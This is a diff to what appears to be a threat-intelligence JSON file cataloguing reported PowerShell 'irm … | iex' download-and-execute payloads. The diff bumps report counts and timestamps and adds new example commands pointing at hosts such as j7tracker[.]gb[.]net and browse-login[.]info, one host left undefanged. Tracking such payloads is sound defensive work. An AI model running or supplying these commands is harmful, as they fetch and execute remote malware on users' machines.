@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 87,
-    "ReportCount": 87,
+    "DistinctPayloadCount": 90,
+    "ReportCount": 90,
     "FirstSeen": "2026-11-18T21:44:11.264000+00:00",
-    "LastSeen": "2026-11-25T15:53:57.691000+00:00",
+    "LastSeen": "2026-11-25T20:54:09.194000+00:00",
     "ReportIds": [
       "cmwmnff871tna0omlqrlqhndl",
       "cmwmnfqnc1tp70oml3we4437f",
@@ -92,7 +92,10 @@
       "cmwvgcc250ejp0nml79vyx8ba",
       "cmwvgde1d0elj0nmlvb8f17fw",
       "cmwvnxzc10fac0nmlrhg9rp82",
-      "cmwwazzqj0i870nmlxasb8r3g"
+      "cmwwazzqj0i870nmlxasb8r3g",
+      "cmwwldlhb02lr0omlx7m0bqxy",
+      "cmwwlgja502pj0omlo4amn8ka",
+      "cmwwlq1gr033y0omlgovcqfpm"
     ],
     "PayloadExamples": [
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/02db2195c02a03ad')|iex",
@@ -171,12 +174,15 @@
       "(irm 'https://j7tracker[.]gb[.]net/click/6969303e6ea8eb03')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/click/8117764681afc8de')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/click/8d6a62fbc425bc67')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/gabo58lfmx/46d88f5544dd39f6')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/gabo58lfmx/aca3a98798ec3d08')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/gabo58lfmx/ca3229b1985ab5e5')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/gabo58lfmx/e47acd3c810cfbb1')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/hn/6b4fae7bb06cf009')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/ki9ao4wpdn/3d32e71b41be6ac2')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/online/ec2a5899511dfa69')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/prolivdante1/11e3b89ef6427fe6')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/sw1la1x22k/8100c381816daa56')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/wp/1bc76e55aa259b71')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/wp/5c258d979e8e5608')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/wp/6da752f480b0c5f8')|iex",
@@ -186,10 +192,10 @@
   },
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 49,
-    "ReportCount": 49,
+    "DistinctPayloadCount": 50,
+    "ReportCount": 50,
     "FirstSeen": "2026-11-18T22:50:05.086000+00:00",
-    "LastSeen": "2026-11-25T20:23:41.768000+00:00",
+    "LastSeen": "2026-11-25T20:35:21.405000+00:00",
     "ReportIds": [
       "cmwmps60l1tve0oml0q574odl",
       "cmwmqp0cv1uc20oml7a6uzgnn",
@@ -239,7 +245,8 @@
       "cmwwbwpru0j9h0nmlgq3fci7c",
       "cmwwj0nvv000e0omlrzpsql9i",
       "cmwwjeyhw006g0omlygg13f11",
-      "cmwwkmver01io0omlprb0kkam"
+      "cmwwkmver01io0omlprb0kkam",
+      "cmwwl1v8y024o0omlfdmj1ia6"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/336728d213008c22'|iex;",
@@ -248,6 +255,7 @@
       "irm 'browse-cloud.codes/e42bbacd936c1293'|iex;",
       "irm 'browse-login[.]info/083af9e16202853f'|iex;",
       "irm 'browse-login[.]info/4ecdb196ede70a4a'|iex;",
+      "irm 'browse-login[.]info/5f9f679de6720a09'|iex;",
       "irm 'browse-login[.]info/9a3e2f700f7d099a'|iex;",
       "irm 'browse-login[.]info/a0ab86b89832a232'|iex;",
       "irm 'browse-login[.]info/dd19016b6c277d04'|iex;",
